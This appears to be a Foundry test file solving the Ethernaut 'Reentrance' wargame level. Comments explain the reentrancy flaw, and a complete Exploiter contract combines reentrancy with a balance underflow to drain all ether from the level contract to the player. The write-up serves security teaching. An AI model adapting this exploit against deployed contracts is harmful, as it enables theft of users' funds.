// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // Reentrance use Solidity <0.8 so is prone to under/overflow errors but
        // this is not a problem because it's also usijng SafeMath

        // The big problem here is that it's handling transfer of ETH via `call`
        // without using any Reentrancy guard or following the "Checks-Effects-Interactions Pattern"
        // which strongly suggest you to update the contract's state BEFORE any external interaction
        // The correct flow should be: check internal state, if everything is ok update the state
        // and only after that make external interactions
        // More info:
        // - https://docs.soliditylang.org/en/v0.8.15/security-considerations.html#use-the-checks-effects-interactions-pattern
        // - https://swcregistry.io/docs/SWC-107
        // - https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html

        // Reentrancy work that you "reenter" the same code but the contract state has not been updated (this is the problem)
        // Each Ethereum block has a maximum size so we need to be sure to not exeed that size or our transaction will fail
        // This is the reason why we need to set a correct value for our donation that will also be the amount that we
        // can withdraw in loop
        // Depending on the user funds we could match the same amount in the balance of the victim contract
        // in this case just to validate the reentrancy we will make a donation of 1/100 of the balance
        // This means that we are going to re-enter 100 time to drain all the funds!

        // https://blog.openzeppelin.com/reentrancy-after-istanbul

        // Balance of player before
        uint256 playerBalance = player.balance;
        uint256 levelBalance = address(level).balance;

        // Deploy our exploiter contract
        // ExploiterLoop exploiter = new ExploiterLoop(level);

        // start the exploit
        // exploiter.exploit{value: levelBalance / 100}();

        // withdraw all the funds
        // exploiter.withdraw();

        // Exploit by using a mix of reentrancy and underflow
        // Deploy our exploiter contract
        Exploiter exploiter = new Exploiter(level);
        // start the exploit
        exploiter.exploit{value: 1}();
        // withdraw all the funds
        exploiter.withdraw();

        // check that the victim has no more ether
        assertEq(address(level).balance, 0);

        // check that the player has all the ether present before in the victim contract
        assertEq(player.balance, playerBalance + levelBalance);

        vm.stopPrank();
    }
}

contract Exploiter {
    Reentrance victim;
    bool exploited;
    address private owner;
    uint256 initialDonation;
    constructor(Reentrance _victim) public {
        victim = _victim;
        owner = msg.sender;
        exploited = false;
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }

    function exploit() external payable {
        // require(msg.sender == owner, "only owner allowed");
        require(msg.value > 0, "donate something!");
        initialDonation = msg.value;

        victim.donate{value: initialDonation}(address(this));

        victim.withdraw(initialDonation);

        // at this point reentrancy already occurred in our receive method.
        victim.withdraw(address(victim).balance);
    }

    receive() external payable {
        // We need to re-enter only once
        // By re-entering our new balance will be equal to (2^256)-1
        if (!exploited) {
            exploited = true;

            // re-enter the contract withdrawing another wei
            victim.withdraw(initialDonation);
        }
    }
}